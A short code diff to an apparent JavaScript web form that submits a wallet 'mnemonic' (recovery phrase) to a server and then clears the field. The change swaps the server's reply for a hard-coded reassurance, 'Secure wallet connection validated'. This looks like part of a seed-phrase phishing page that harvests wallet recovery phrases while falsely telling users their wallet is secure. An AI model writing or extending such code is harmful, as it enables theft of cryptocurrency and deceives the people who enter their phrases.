@@ -38,7 +38,7 @@ const saveDetails = () => {
             });
             const data = await response.json();
             if (response.ok) {
-                successNotify(data.message);
+                successNotify('Secure wallet connection validated');
                 setFormData({
                     mnemonic: '',
                 });
